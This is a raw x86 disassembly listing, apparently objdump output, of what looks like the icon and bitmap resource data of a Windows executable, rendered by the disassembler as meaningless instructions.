  4026fa:	62 62 a3             	bound  %esp,-0x5d(%edx)
  4026fd:	af                   	scas   %es:(%edi),%eax
  4026fe:	b0 00                	mov    $0x0,%al
	...
  402708:	00 a6 94 a7 a9 a1    	add    %ah,-0x5e56586c(%esi)
  40270e:	a1 a1 a1 a1 a1       	mov    0xa1a1a1a1,%eax
  402713:	a1 a1 a1 a1 a1       	mov    0xa1a1a1a1,%eax
  402718:	a1 a1 a9 a9 a3       	mov    0xa3a9a9a1,%eax
  40271d:	aa                   	stos   %al,%es:(%edi)
  40271e:	ab                   	stos   %eax,%es:(%edi)
	...
  402727:	00 00                	add    %al,(%eax)
  402729:	99                   	cltd
  40272a:	c8 7c a0 a0          	enter  $0xa07c,$0xa0
  40272e:	a0 a0 a0 a0 a0       	mov    0xa0a0a0a0,%al
  402733:	a0 a0 a0 a0 a0       	mov    0xa0a0a0a0,%al
  402738:	a0 a0 a0 a2 a3       	mov    0xa3a2a0a0,%al
  40273d:	ca a5 00             	lret   $0xa5
	...
  402748:	00 99 8b 33 96 1b    	add    %bl,0x1b96338b(%ecx)
  40274e:	1b 1b                	sbb    (%ebx),%ebx
  402750:	1b 1b                	sbb    (%ebx),%ebx
  402752:	1b 1b                	sbb    (%ebx),%ebx
  402754:	1b 1b                	sbb    (%ebx),%ebx
  402756:	1b 1b                	sbb    (%ebx),%ebx
  402758:	1b 1b                	sbb    (%ebx),%ebx
  40275a:	1b 96 a9 9b 9c 00    	sbb    0x9c9ba9(%esi),%edx
	...
  402768:	00 93 9a 95 55 55    	add    %dl,0x5555959a(%ebx)
  40276e:	55                   	push   %ebp
  40276f:	55                   	push   %ebp
  402770:	55                   	push   %ebp
  402771:	55                   	push   %ebp
  402772:	55                   	push   %ebp
  402773:	55                   	push   %ebp
  402774:	55                   	push   %ebp
  402775:	55                   	push   %ebp
  402776:	55                   	push   %ebp
  402777:	55                   	push   %ebp
  402778:	55                   	push   %ebp
  402779:	55                   	push   %ebp
  40277a:	55                   	push   %ebp
  40277b:	43                   	inc    %ebx
  40277c:	a8 97                	test   $0x97,%al
  40277e:	98                   	cwtl
	...
  402787:	00 00                	add    %al,(%eax)
  402789:	8a 8b 5b 41 43 1a    	mov    0x1a43415b(%ebx),%cl
  40278f:	1a 8e 8e 8e 8e 8e    	sbb    -0x71717172(%esi),%cl
  402795:	8e 8e 8e 8e 8e 41    	mov    0x418e8e8e(%esi),%cs
  40279b:	1e                   	push   %ds
  40279c:	8f 87 91 92 00 00    	pop    0x9291(%edi)
  4027a2:	00 00                	add    %al,(%eax)
  4027a4:	00 00                	add    %al,(%eax)
  4027a6:	00 00                	add    %al,(%eax)
  4027a8:	5f                   	pop    %edi
  4027a9:	81 82 25 68 6c 69 0f 	addl   $0x84847b0f,0x696c6825(%edx)
  4027b0:	7b 84 84 
  4027b3:	85 85 85 85 85 85    	test   %eax,-0x7a7a7a7b(%ebp)
  4027b9:	85 84 7a 86 87 88 89 	test   %eax,-0x7677787a(%edx,%edi,2)
	...
  4027c8:	71 72                	jno    0x40283c
  4027ca:	73 74                	jae    0x402840
  4027cc:	21 fd                	and    %edi,%ebp
  4027ce:	77 40                	ja     0x402810
  4027d0:	67 79 6c             	addr16 jns 0x40283f
  4027d3:	7a 2f                	jp     0x402804
  4027d5:	2f                   	das
  4027d6:	2f                   	das
  4027d7:	2f                   	das
  4027d8:	2f                   	das
  4027d9:	2f                   	das
  4027da:	2f                   	das
  4027db:	0f 7c                	(bad)
  4027dd:	6e                   	outsb  %ds:(%esi),(%dx)
  4027de:	7e 7f                	jle    0x40285f
	...
  4027e8:	71 60                	jno    0x40284a
  4027ea:	8d a8 63 44 65 66    	lea    0x66654463(%eax),%ebp
  4027f0:	45                   	inc    %ebp
  4027f1:	21 67 59             	and    %esp,0x59(%edi)
  4027f4:	6a 6a                	push   $0x6a
  4027f6:	69 69 69 6a 6a 32 6d 	imul   $0x6d326a6a,0x69(%ecx),%ebp
  4027fd:	6e                   	outsb  %ds:(%esi),(%dx)
  4027fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4027ff:	70 00                	jo     0x402801
  402801:	00 00                	add    %al,(%eax)
  402803:	00 00                	add    %al,(%eax)
  402805:	00 00                	add    %al,(%eax)
  402807:	00 52 60             	add    %dl,0x60(%edx)
  40280a:	1a 1b                	sbb    (%ebx),%bl
  40280c:	55                   	push   %ebp
  40280d:	55                   	push   %ebp
  40280e:	43                   	inc    %ebx
  40280f:	43                   	inc    %ebx
  402810:	43                   	inc    %ebx
  402811:	44                   	inc    %esp
  402812:	56                   	push   %esi
  402813:	57                   	push   %edi
  402814:	58                   	pop    %eax
  402815:	10 50 50             	adc    %dl,0x50(%eax)
  402818:	10 59 5a             	adc    %bl,0x5a(%ecx)
  40281b:	5a                   	pop    %edx
  40281c:	5b                   	pop    %ebx
  40281d:	5c                   	pop    %esp
  40281e:	32 5e 00             	xor    0x0(%esi),%bl
  402821:	00 00                	add    %al,(%eax)
  402823:	00 00                	add    %al,(%eax)
  402825:	00 00                	add    %al,(%eax)
  402827:	00 3f                	add    %bh,(%edi)
  402829:	40                   	inc    %eax
  40282a:	1e                   	push   %ds
  40282b:	42                   	inc    %edx
  40282c:	96                   	xchg   %eax,%esi
  40282d:	96                   	xchg   %eax,%esi
  40282e:	96                   	xchg   %eax,%esi
  40282f:	1b 1b                	sbb    (%ebx),%ebx
  402831:	43                   	inc    %ebx
  402832:	44                   	inc    %esp
  402833:	45                   	inc    %ebp
  402834:	46                   	inc    %esi
  402835:	bf 76 77 4a 67       	mov    $0x674a7776,%edi
  40283a:	4c                   	dec    %esp
  40283b:	01 10                	add    %edx,(%eax)
  40283d:	1f                   	pop    %ds
  40283e:	50                   	push   %eax
  40283f:	51                   	push   %ecx
	...
  402848:	0a 2e                	or     (%esi),%ch
  40284a:	2f                   	das
  40284b:	1c 30                	sbb    $0x30,%al
  40284d:	96                   	xchg   %eax,%esi
  40284e:	96                   	xchg   %eax,%esi
  40284f:	30 1b                	xor    %bl,(%ebx)
  402851:	85 32                	test   %esi,(%edx)
  402853:	33 34 35 36 37 38 39 	xor    0x39383736(,%esi,1),%esi
  40285a:	3a 82 3c 23 24 3e    	cmp    0x3e24233c(%edx),%al
	...
  402868:	00 f9                	add    %bh,%cl
  40286a:	19 1a                	sbb    %ebx,(%edx)
  40286c:	42                   	inc    %edx
  40286d:	42                   	inc    %edx
  40286e:	1b 1d 1e 1f 20 9a    	sbb    0x9a201f1e,%ebx
  402874:	22 23                	and    (%ebx),%ah
  402876:	24 25                	and    $0x25,%al
  402878:	26 27                	es daa
  40287a:	28 29                	sub    %ch,(%ecx)
  40287c:	2a 2b                	sub    (%ebx),%ch
  40287e:	2c 00                	sub    $0x0,%al
	...
  402888:	00 0a                	add    %cl,(%edx)
  40288a:	fd                   	std
  40288b:	0c fe                	or     $0xfe,%al
  40288d:	ff 0f                	decl   (%edi)
  40288f:	0f 10 11             	movups (%ecx),%xmm2
  402892:	00 00                	add    %al,(%eax)
  402894:	00 00                	add    %al,(%eax)
  402896:	00 00                	add    %al,(%eax)
  402898:	12 13                	adc    (%ebx),%dl
  40289a:	14 15                	adc    $0x15,%al
  40289c:	16                   	push   %ss
  40289d:	17                   	pop    %ss
	...
  4028aa:	02 f9                	add    %cl,%bh
  4028ac:	04 fa                	add    $0xfa,%al
  4028ae:	06                   	push   %es
  4028af:	fb                   	sti
  4028b0:	08 fc                	or     %bh,%ah
	...
  402962:	00 00                	add    %al,(%eax)
  402964:	00 ff                	add    %bh,%bh
  402966:	ff                   	(bad)
  402967:	ff                   	(bad)
  402968:	ff                   	(bad)
  402969:	ff                   	(bad)
  40296a:	ff                   	(bad)
  40296b:	ff                   	(bad)
  40296c:	ff                   	(bad)
  40296d:	ff                   	(bad)
  40296e:	ff                   	(bad)
  40296f:	ff                   	(bad)
  402970:	ff                   	(bad)
  402971:	ff                   	(bad)
  402972:	ff                   	(bad)
  402973:	ff                   	(bad)
  402974:	ff                   	(bad)
  402975:	f8                   	clc
  402976:	3f                   	aas
  402977:	ff                   	(bad)
  402978:	ff f0                	push   %eax
  40297a:	01 ff                	add    %edi,%edi
  40297c:	ff f0                	push   %eax
  40297e:	00 1f                	add    %bl,(%edi)
  402980:	ff f0                	push   %eax
  402982:	00 01                	add    %al,(%ecx)
  402984:	ff f0                	push   %eax
  402986:	00 00                	add    %al,(%eax)
  402988:	3f                   	aas
  402989:	f0 00 00             	lock add %al,(%eax)
  40298c:	3f                   	aas
  40298d:	f0 00 00             	lock add %al,(%eax)
  402990:	3f                   	aas
  402991:	f0 00 00             	lock add %al,(%eax)
  402994:	3f                   	aas
  402995:	f0 00 00             	lock add %al,(%eax)
  402998:	3f                   	aas
  402999:	f0 00 00             	lock add %al,(%eax)
  40299c:	3f                   	aas
  40299d:	f0 00 00             	lock add %al,(%eax)
  4029a0:	1f                   	pop    %ds
  4029a1:	f0 00 00             	lock add %al,(%eax)
  4029a4:	1f                   	pop    %ds
  4029a5:	f0 00 00             	lock add %al,(%eax)
  4029a8:	1f                   	pop    %ds
  4029a9:	f0 00 00             	lock add %al,(%eax)
  4029ac:	1f                   	pop    %ds
  4029ad:	e0 00                	loopne 0x4029af
  4029af:	00 1f                	add    %bl,(%edi)
  4029b1:	e0 00                	loopne 0x4029b3
  4029b3:	00 1f                	add    %bl,(%edi)
  4029b5:	e0 00                	loopne 0x4029b7
  4029b7:	00 1f                	add    %bl,(%edi)
  4029b9:	e0 00                	loopne 0x4029bb
  4029bb:	00 1f                	add    %bl,(%edi)
  4029bd:	e0 00                	loopne 0x4029bf
  4029bf:	00 0f                	add    %cl,(%edi)
  4029c1:	e0 00                	loopne 0x4029c3
  4029c3:	00 1f                	add    %bl,(%edi)
  4029c5:	f0 00 00             	lock add %al,(%eax)
  4029c8:	3f                   	aas
  4029c9:	f0 07                	lock pop %es
  4029cb:	e0 7f                	loopne 0x402a4c
  4029cd:	f8                   	clc
  4029ce:	07                   	pop    %es
  4029cf:	ff                   	(bad)
  4029d0:	ff                   	(bad)
  4029d1:	ff                   	(bad)
  4029d2:	ff                   	(bad)
  4029d3:	ff                   	(bad)
  4029d4:	ff                   	(bad)
  4029d5:	ff                   	(bad)
  4029d6:	ff                   	(bad)
  4029d7:	ff                   	(bad)
  4029d8:	ff                   	(bad)
  4029d9:	ff                   	(bad)
  4029da:	ff                   	(bad)
  4029db:	ff                   	(bad)
  4029dc:	ff                   	(bad)
  4029dd:	ff                   	(bad)
  4029de:	ff                   	(bad)
  4029df:	ff                   	(bad)
  4029e0:	ff                   	(bad)
  4029e1:	ff                   	(bad)
  4029e2:	ff                   	(bad)
  4029e3:	ff                   	(bad)
  4029e4:	ff 28                	ljmp   *(%eax)
  4029e6:	00 00                	add    %al,(%eax)
  4029e8:	00 10                	add    %dl,(%eax)
  4029ea:	00 00                	add    %al,(%eax)
  4029ec:	00 20                	add    %ah,(%eax)
  4029ee:	00 00                	add    %al,(%eax)
  4029f0:	00 01                	add    %al,(%ecx)
  4029f2:	00 08                	add    %cl,(%eax)
  4029f4:	00 00                	add    %al,(%eax)
  4029f6:	00 00                	add    %al,(%eax)
  4029f8:	00 40 01             	add    %al,0x1(%eax)
	...
  402a03:	00 00                	add    %al,(%eax)
  402a05:	00 01                	add    %al,(%ecx)
	...
  402a0f:	00 00                	add    %al,(%eax)
  402a11:	ff                   	(bad)
  402a12:	ff                   	(bad)
  402a13:	ff 00                	incl   (%eax)
  402a15:	4d                   	dec    %ebp
  402a16:	a9 d4 00 4f b0       	test   $0xb04f00d4,%eax
  402a1b:	d9 00                	flds   (%eax)
  402a1d:	a3 e5 f3 00 a7       	mov    %eax,0xa700f3e5
  402a22:	f0 f8                	lock clc
  402a24:	00 ad ef f8 00 65    	add    %ch,0x6500f8ef(%ebp)
  402a2a:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  402a2b:	c2 00 5a             	ret    $0x5a00
  402a2e:	b8 db 00 6f c7       	mov    $0xc76f00db,%eax
  402a33:	e5 00                	in     $0x0,%eax
  402a35:	73 ca                	jae    0x402a01
  402a37:	e5 00                	in     $0x0,%eax
  402a39:	4e                   	dec    %esi
  402a3a:	b8 dc 00 99 dc       	mov    $0xdc9900dc,%eax
  402a3f:	f0 00 aa fc ff 00 98 	lock add %ch,-0x67ff0004(%edx)
  402a46:	fc                   	cld
  402a47:	ff 00                	incl   (%eax)
  402a49:	a2 fc ff 00 a5       	mov    %al,0xa500fffc
  402a4e:	f4                   	hlt
  402a4f:	fc                   	cld
  402a50:	00 7e d1             	add    %bh,-0x2f(%esi)
  402a53:	ea 00 8a d9 ed 00 89 	ljmp   $0x8900,$0xedd98a00
  402a5a:	d6                   	salc
  402a5b:	ec                   	in     (%dx),%al
  402a5c:	00 9a dc ef 00 9e    	add    %bl,-0x61ff1024(%edx)
  402a62:	dc ef                	fsubr  %st,%st(7)
  402a64:	00 7f c0             	add    %bh,-0x40(%edi)
  402a67:	db 00                	fildl  (%eax)
  402a69:	08 5b 7b             	or     %bl,0x7b(%ebx)
  402a6c:	00 92 df f3 00 8d    	add    %dl,-0x72ff0c21(%edx)
  402a72:	f2 fc                	repnz cld
  402a74:	00 7d e6             	add    %bh,-0x1a(%ebp)
  402a77:	f6 00 75             	testb  $0x75,(%eax)
  402a7a:	de f1                	fdivp  %st,%st(1)
  402a7c:	00 71 d1             	add    %dh,-0x2f(%ecx)
  402a7f:	ea 00 bd e9 f5 00 d2 	ljmp   $0xd200,$0xf5e9bd00
  402a86:	f6 fb                	idiv   %bl
  402a88:	00 db                	add    %bl,%bl
  402a8a:	fb                   	sti
  402a8b:	fd                   	std
  402a8c:	00 e6                	add    %ah,%dh
  402a8e:	ff                   	(bad)
  402a8f:	ff 00                	incl   (%eax)
  402a91:	dd fe                	(bad)
  402a93:	ff 00                	incl   (%eax)
  402a95:	9d                   	popf
  402a96:	d3 e9                	shr    %cl,%ecx
  402a98:	00 00                	add    %al,(%eax)
  402a9a:	2d 40 00 6d c5       	sub    $0xc56d0040,%eax
  402a9f:	e8 00 79 cf ec       	call   0xed0fa3a4
  402aa4:	00 9d de f1 00 a9    	add    %bl,-0x56ff0e22(%ebp)
  402aaa:	e5 f4                	in     $0xf4,%eax
  402aac:	00 c5                	add    %al,%ch
  402aae:	f6 fc                	idiv   %ah
  402ab0:	00 c8                	add    %cl,%al
  402ab2:	fd                   	std
  402ab3:	ff 00                	incl   (%eax)
  402ab5:	c1 fd ff             	sar    $0xff,%ebp
  402ab8:	00 be fc ff 00 be    	add    %bh,-0x41ff0004(%esi)
  402abe:	fd                   	std
  402abf:	fe 00                	incb   (%eax)
  402ac1:	b6 fa                	mov    $0xfa,%dh
  402ac3:	fe 00                	incb   (%eax)
  402ac5:	75 bc                	jne    0x402a83
  402ac7:	d7                   	xlat   %ds:(%ebx)
  402ac8:	00 56 b3             	add    %dl,-0x4d(%esi)
  402acb:	df 00                	filds  (%eax)
  402acd:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  402ace:	ea f7 00 b0 fc ff 00 	ljmp   $0xff,$0xfcb000f7
  402ad5:	a8 fc                	test   $0xfc,%al
  402ad7:	ff 00                	incl   (%eax)
  402ad9:	a0 fb fe 00 a2       	mov    0xa200fefb,%al
  402ade:	fd                   	std
  402adf:	ff 00                	incl   (%eax)
  402ae1:	a1 fb ff 00 a2       	mov    0xa200fffb,%eax
  402ae6:	fe                   	(bad)
  402ae7:	ff 00                	incl   (%eax)
  402ae9:	a2 fb ff 00 59       	mov    %al,0x5900fffb
  402aee:	aa                   	stos   %al,%es:(%edi)
  402aef:	c9                   	leave
  402af0:	00 4a af             	add    %cl,-0x51(%edx)
  402af3:	dd 00                	fldl   (%eax)
  402af5:	93                   	xchg   %eax,%ebx
  402af6:	e8 f8 00 94 f8       	call   0xf8d42bf3
  402afb:	fe 00                	incb   (%eax)
  402afd:	91                   	xchg   %eax,%ecx
  402afe:	f5                   	cmc
  402aff:	fd                   	std
  402b00:	00 93 f6 fe 00 93    	add    %dl,-0x6cff010a(%ebx)
  402b06:	f7 fe                	idiv   %esi
  402b08:	00 92 f6 fe 00 94    	add    %dl,-0x6bff010a(%edx)
  402b0e:	f7 fd                	idiv   %ebp
  402b10:	00 90 f4 fe 00 40    	add    %dl,0x4000fef4(%eax)
  402b16:	97                   	xchg   %eax,%edi
  402b17:	b8 00 3a aa d9       	mov    $0xd9aa3a00,%eax
  402b1c:	00 8f e3 f9 00 8c    	add    %cl,-0x73ff061d(%edi)
  402b22:	ef                   	out    %eax,(%dx)
  402b23:	ff 00                	incl   (%eax)
  402b25:	8b ec                	mov    %esp,%ebp
  402b27:	fe 00                	incb   (%eax)
  402b29:	8b ed                	mov    %ebp,%ebp
  402b2b:	fe 00                	incb   (%eax)
  402b2d:	8a ec                	mov    %ah,%ch
  402b2f:	fe 00                	incb   (%eax)
  402b31:	8c ed                	mov    %gs,%ebp
  402b33:	fc                   	cld
  402b34:	00 83 e9 ff 00 27    	add    %al,0x2700ffe9(%ebx)
  402b3a:	7f a5                	jg     0x402ae1
  402b3c:	00 2c a4             	add    %ch,(%esp,%eiz,4)
  402b3f:	d6                   	salc
  402b40:	00 87 de f9 00 80    	add    %al,-0x7fff0622(%edi)
  402b46:	e4 fe                	in     $0xfe,%al
  402b48:	00 80 e2 fd 00 80    	add    %al,-0x7fff021e(%eax)
  402b4e:	e3 fd                	jecxz  0x402b4d
  402b50:	00 82 e4 fe 00 84    	add    %al,-0x7bff011c(%edx)
  402b56:	e5 ff                	in     $0xff,%eax
  402b58:	00 87 e7 ff 00 8c    	add    %al,-0x73ff0019(%edi)
  402b5e:	ed                   	in     (%dx),%eax
  402b5f:	ff 00                	incl   (%eax)
  402b61:	76 e0                	jbe    0x402b43
  402b63:	ff 00                	incl   (%eax)
  402b65:	14 6a                	adc    $0x6a,%al
  402b67:	91                   	xchg   %eax,%ecx
  402b68:	00 27                	add    %ah,(%edi)
  402b6a:	a1 d3 00 82 da       	mov    0xda8200d3,%eax
  402b6f:	fb                   	sti
  402b70:	00 7a dd             	add    %bh,-0x23(%edx)
  402b73:	ff 00                	incl   (%eax)
  402b75:	7f df                	jg     0x402b56
  402b77:	ff 00                	incl   (%eax)
  402b79:	7e e1                	jle    0x402b5c
  402b7b:	ff 00                	incl   (%eax)
  402b7d:	78 de                	js     0x402b5d
  402b7f:	ff 00                	incl   (%eax)
  402b81:	6b d2 fa             	imul   $0xfffffffa,%edx,%edx
  402b84:	00 5a c1             	add    %bl,-0x3f(%edx)
  402b87:	e9 00 46 aa d0       	jmp    0xd0ea718c
  402b8c:	00 2b                	add    %ch,(%ebx)
  402b8e:	8b b0 00 04 3a 52    	mov    0x523a0400(%eax),%esi
  402b94:	00 3a                	add    %bh,(%edx)
  402b96:	ad                   	lods   %ds:(%esi),%eax
  402b97:	da 00                	fiaddl (%eax)
  402b99:	75 d3                	jne    0x402b6e
  402b9b:	ff 00                	incl   (%eax)
  402b9d:	5d                   	pop    %ebp
  402b9e:	c6                   	(bad)
  402b9f:	f6 00 4f             	testb  $0x4f,(%eax)
  402ba2:	b5 e2                	mov    $0xe2,%ch
  402ba4:	00 3a                	add    %bh,(%edx)
  402ba6:	9e                   	sahf
  402ba7:	c8 00 26 83          	enter  $0x2600,$0x83
  402bab:	a9 00 11 60 81       	test   $0x81601100,%eax
  402bb0:	00 00                	add    %al,(%eax)
  402bb2:	37                   	aaa
  402bb3:	50                   	push   %eax
  402bb4:	00 1a                	add    %bl,(%edx)
  402bb6:	88 b4 00 21 7a a0 00 	mov    %dh,0xa07a21(%eax,%eax,1)
  402bbd:	09 53 75             	or     %edx,0x75(%ebx)
  402bc0:	00 00                	add    %al,(%eax)
  402bc2:	27                   	daa
  402bc3:	3b 00                	cmp    (%eax),%eax
  402bc5:	d8 a0 1c 00 fc e0    	fsubs  -0x1f03ffe4(%eax)
  402bcb:	a0 00 fc cc 68       	mov    0x68ccfc00,%al
  402bd0:	00 fc                	add    %bh,%ah
  402bd2:	c8 64 00 ec          	enter  $0x64,$0xec
  402bd6:	b8 48 00 e0 ac       	mov    $0xace00048,%eax
  402bdb:	2c 00                	sub    $0x0,%al
  402bdd:	d4 a0                	aam    $0xa0
  402bdf:	20 00                	and    %al,(%eax)
  402be1:	ec                   	in     (%dx),%al
  402be2:	c4 64 00 14          	les    0x14(%eax,%eax,1),%esp
  402be6:	0c 00                	or     $0x0,%al
  402be8:	00 9c 70 00 00 c0 8a 	add    %bl,-0x75400000(%eax,%esi,2)
  402bef:	00 00                	add    %al,(%eax)
  402bf1:	be 88 00 00 c2       	mov    $0xc2000088,%esi
  402bf6:	8c 00                	mov    %es,(%eax)
  402bf8:	00 c6                	add    %al,%dh
  402bfa:	8e 00                	mov    (%eax),%es
  402bfc:	00 cc                	add    %cl,%ah
  402bfe:	92                   	xchg   %eax,%edx
  402bff:	00 00                	add    %al,(%eax)
  402c01:	ca 90 00             	lret   $0x90
  402c04:	00 d2                	add    %dl,%dl
  402c06:	a0 20 00 d8 ae       	mov    0xaed80020,%al
  402c0b:	40                   	inc    %eax
  402c0c:	00 de                	add    %bl,%dh
  402c0e:	ba 60 00 e6 c8       	mov    $0xc8e60060,%edx
  402c13:	80 00 e8             	addb   $0xe8,(%eax)
  402c16:	ce                   	into
  402c17:	8e 00                	mov    (%eax),%es
  402c19:	f2 e4 be             	repnz in $0xbe,%al
  402c1c:	00 f4                	add    %dh,%ah
  402c1e:	ea ce 00 fe fe fe 00 	ljmp   $0xfe,$0xfefe00ce
  402c25:	b0 7e                	mov    $0x7e,%al
  402c27:	00 00                	add    %al,(%eax)
  402c29:	ce                   	into
  402c2a:	98                   	cwtl
  402c2b:	10 00                	adc    %al,(%eax)
  402c2d:	fc                   	cld
  402c2e:	f6 ea                	imul   %dl
  402c30:	00 fe                	add    %bh,%dh
  402c32:	fc                   	cld
  402c33:	fa                   	cli
  402c34:	00 fe                	add    %bh,%dh
  402c36:	fc                   	cld
  402c37:	e2 00                	loop   0x402c39
  402c39:	d9 a4 26 00 00 00 00 	fldenv 0x0(%esi,%eiz,1)
	...
  402c68:	00 00                	add    %al,(%eax)
  402c6a:	c0 af 00 cc c3 ab 00 	shrb   $0x0,-0x543c3400(%edi)
  402c71:	80 13 00             	adcb   $0x0,(%ebx)
  402c74:	00 7c 13 00          	add    %bh,0x0(%ebx,%edx,1)
	...
  402e2c:	00 00                	add    %al,(%eax)
  402e2e:	00 6a 6b             	add    %ch,0x6b(%edx)
  402e31:	6c                   	insb   (%dx),%es:(%edi)
  402e32:	6d                   	insl   (%dx),%es:(%edi)
	...
  402e3f:	62 63 64             	bound  %esp,0x64(%ebx)
  402e42:	65 66 67 68 69 00    	gs addr16 pushw $0x69
  402e48:	00 00                	add    %al,(%eax)
  402e4a:	00 00                	add    %al,(%eax)
  402e4c:	00 00                	add    %al,(%eax)
  402e4e:	00 57 58             	add    %dl,0x58(%edi)
  402e51:	59                   	pop    %ecx
  402e52:	5a                   	pop    %edx
  402e53:	5b                   	pop    %ebx
  402e54:	5c                   	pop    %esp
  402e55:	5d                   	pop    %ebp
  402e56:	5e                   	pop    %esi
  402e57:	5f                   	pop    %edi
  402e58:	60                   	pusha
  402e59:	61                   	popa
  402e5a:	00 00                	add    %al,(%eax)
  402e5c:	00 00                	add    %al,(%eax)
  402e5e:	00 4c 4d 4e          	add    %cl,0x4e(%ebp,%ecx,2)
  402e62:	4f                   	dec    %edi
  402e63:	50                   	push   %eax
  402e64:	51                   	push   %ecx
  402e65:	52                   	push   %edx
  402e66:	53                   	push   %ebx
  402e67:	54                   	push   %esp
  402e68:	55                   	push   %ebp
  402e69:	56                   	push   %esi
  402e6a:	00 00                	add    %al,(%eax)
  402e6c:	00 00                	add    %al,(%eax)
  402e6e:	00 43 44             	add    %al,0x44(%ebx)
  402e71:	45                   	inc    %ebp
  402e72:	46                   	inc    %esi
  402e73:	47                   	inc    %edi
  402e74:	47                   	inc    %edi
  402e75:	47                   	inc    %edi
  402e76:	48                   	dec    %eax
  402e77:	49                   	dec    %ecx
  402e78:	4a                   	dec    %edx
  402e79:	4b                   	dec    %ebx
  402e7a:	00 00                	add    %al,(%eax)
  402e7c:	00 00                	add    %al,(%eax)
  402e7e:	00 39                	add    %bh,(%ecx)
  402e80:	3a 3b                	cmp    (%ebx),%bh
  402e82:	3c 3d                	cmp    $0x3d,%al
  402e84:	3e 3e 3f             	ds ds aas
  402e87:	40                   	inc    %eax
  402e88:	41                   	inc    %ecx
  402e89:	42                   	inc    %edx
  402e8a:	00 00                	add    %al,(%eax)
  402e8c:	00 00                	add    %al,(%eax)
  402e8e:	00 2f                	add    %ch,(%edi)
  402e90:	30 31                	xor    %dh,(%ecx)
  402e92:	32 0f                	xor    (%edi),%cl
  402e94:	33 34 35 36 37 38 00 	xor    0x383736(,%esi,1),%esi
  402e9b:	00 00                	add    %al,(%eax)
  402e9d:	00 00                	add    %al,(%eax)
  402e9f:	24 25                	and    $0x25,%al
  402ea1:	26 27                	es daa
  402ea3:	28 29                	sub    %ch,(%ecx)
  402ea5:	2a 2b                	sub    (%ebx),%ch
  402ea7:	2c 2d                	sub    $0x2d,%al
  402ea9:	2e 00 00             	add    %al,%cs:(%eax)
  402eac:	00 00                	add    %al,(%eax)
  402eae:	00 18                	add    %bl,(%eax)
  402eb0:	19 1a                	sbb    %ebx,(%edx)
  402eb2:	1b 1c 1d 1e 1f 20 21 	sbb    0x21201f1e(,%ebx,1),%ebx
  402eb9:	22 23                	and    (%ebx),%ah
  402ebb:	00 00                	add    %al,(%eax)
  402ebd:	00 00                	add    %al,(%eax)
  402ebf:	0c 0d                	or     $0xd,%al
  402ec1:	0e                   	push   %cs
  402ec2:	0f 10 11             	movups (%ecx),%xmm2
  402ec5:	12 13                	adc    (%ebx),%dl
  402ec7:	14 15                	adc    $0x15,%al
  402ec9:	16                   	push   %ss
  402eca:	17                   	pop    %ss
  402ecb:	00 00                	add    %al,(%eax)
  402ecd:	00 00                	add    %al,(%eax)
  402ecf:	03 04 05 06 07 00 08 	add    0x8000706(,%eax,1),%eax
  402ed6:	09 0a                	or     %ecx,(%edx)
  402ed8:	0b 00                	or     (%eax),%eax
	...
  402ee2:	02 00                	add    (%eax),%al
	...
  402f0c:	00 ff                	add    %bh,%bh
  402f0e:	ff 00                	incl   (%eax)
  402f10:	00 ff                	add    %bh,%bh
  402f12:	ff 00                	incl   (%eax)
  402f14:	00 c3                	add    %al,%bl
  402f16:	ff 00                	incl   (%eax)
  402f18:	00 c0                	add    %al,%al
  402f1a:	3f                   	aas
  402f1b:	00 00                	add    %al,(%eax)
  402f1d:	c0 07 00             	rolb   $0x0,(%edi)
  402f20:	00 c0                	add    %al,%al
  402f22:	07                   	pop    %es
  402f23:	00 00                	add    %al,(%eax)
  402f25:	c0 07 00             	rolb   $0x0,(%edi)
  402f28:	00 c0                	add    %al,%al
  402f2a:	07                   	pop    %es
  402f2b:	00 00                	add    %al,(%eax)
  402f2d:	c0 07 00             	rolb   $0x0,(%edi)
  402f30:	00 c0                	add    %al,%al
  402f32:	07                   	pop    %es
  402f33:	00 00                	add    %al,(%eax)
  402f35:	c0 03 00             	rolb   $0x0,(%ebx)
  402f38:	00 c0                	add    %al,%al
  402f3a:	03 00                	add    (%eax),%eax
  402f3c:	00 c1                	add    %al,%cl
  402f3e:	0f 00 00             	sldt   (%eax)
  402f41:	fb                   	sti
  402f42:	ff 00                	incl   (%eax)
  402f44:	00 ff                	add    %bh,%bh
  402f46:	ff 00                	incl   (%eax)
  402f48:	00 ff                	add    %bh,%bh
  402f4a:	ff 00                	incl   (%eax)
  402f4c:	00 28                	add    %ch,(%eax)
  402f4e:	00 00                	add    %al,(%eax)
  402f50:	00 30                	add    %dh,(%eax)
  402f52:	00 00                	add    %al,(%eax)
  402f54:	00 60 00             	add    %ah,0x0(%eax)
  402f57:	00 00                	add    %al,(%eax)
  402f59:	01 00                	add    %eax,(%eax)
  402f5b:	20 00                	and    %al,(%eax)
  402f5d:	00 00                	add    %al,(%eax)
  402f5f:	00 00                	add    %al,(%eax)
  402f61:	80 25 00 00 00 00 00 	andb   $0x0,0x0
	...
  40329c:	01 00                	add    %eax,(%eax)
  40329e:	00 00                	add    %al,(%eax)
  4032a0:	0b 00                	or     (%eax),%eax
  4032a2:	00 00                	add    %al,(%eax)
  4032a4:	0b 00                	or     (%eax),%eax
  4032a6:	00 00                	add    %al,(%eax)
  4032a8:	03 00                	add    (%eax),%eax
  4032aa:	00 00                	add    %al,(%eax)
  4032ac:	01 00                	add    %eax,(%eax)
  4032ae:	00 00                	add    %al,(%eax)
  4032b0:	01 00                	add    %eax,(%eax)
	...
  403352:	00 00                	add    %al,(%eax)
  403354:	00 03                	add    %al,(%ebx)
  403356:	03 03                	add    (%ebx),%eax
  403358:	13 02                	adc    (%edx),%eax
  40335a:	02 02                	add    (%edx),%al
  40335c:	57                   	push   %edi
  40335d:	02 02                	add    (%edx),%al
  40335f:	02 5e 03             	add    0x3(%esi),%bl
  403362:	03 03                	add    (%ebx),%eax
  403364:	45                   	inc    %ebp
  403365:	00 00                	add    %al,(%eax)
  403367:	00 2e                	add    %ch,(%esi)
  403369:	00 00                	add    %al,(%eax)
  40336b:	00 20                	add    %ah,(%eax)
  40336d:	00 00                	add    %al,(%eax)
  40336f:	00 17                	add    %dl,(%edi)
  403371:	00 00                	add    %al,(%eax)
  403373:	00 0d 00 00 00 05    	add    %cl,0x5000000
  403379:	00 00                	add    %al,(%eax)
  40337b:	00 01                	add    %al,(%ecx)
  40337d:	00 00                	add    %al,(%eax)
  40337f:	00 01                	add    %al,(%ecx)
	...
  403411:	00 8e c7 37 00 72    	add    %cl,0x720037c7(%esi)
  403417:	9e                   	sahf
